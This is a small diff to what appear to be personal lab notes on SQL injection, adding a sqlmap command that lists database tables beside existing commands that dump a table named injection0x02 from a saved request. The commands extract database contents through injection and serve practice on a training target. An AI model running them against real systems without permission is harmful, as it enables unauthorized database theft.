@@ -123,6 +123,15 @@ sqlmap -r req2.txt --level=2 --dump
 
 dump the payload we got 
 
+to get the tablename 
+
+```sh
+sqlmap -r req2.txt --level=2 --dump --tables
+```
+
+![[Pasted image 20230730165330.png]]
+
+
 ```sh
 sqlmap -r req2.txt --level=2 --dump -T injection0x02
 ```
